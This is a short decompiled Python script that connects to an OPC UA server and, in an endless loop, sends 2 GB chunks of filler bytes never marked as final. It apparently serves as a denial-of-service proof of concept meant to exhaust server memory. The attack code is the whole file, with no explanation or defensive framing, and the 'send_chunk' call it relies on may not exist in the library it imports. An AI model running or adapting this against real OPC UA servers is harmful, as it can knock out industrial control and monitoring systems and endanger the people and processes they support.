# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 237_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 793 bytes
import asyncio
from opcua import Client
client = Client("opc.tcp://localhost:4840/freeopcua/server/")
client.connect()

async def send_large_chunks():
    try:
        while True:
            large_chunk = b'A' * 2147483648
            client.send_chunk(large_chunk, is_final=False)
            print("Sent a large chunk")
            await asyncio.sleep(0.1)

    except Exception as e:
        try:
            print(f"An error occurred: {e}")
        finally:
            e = None
            del e


asyncio.run(send_large_chunks())

# okay decompiling 237_1.pyc
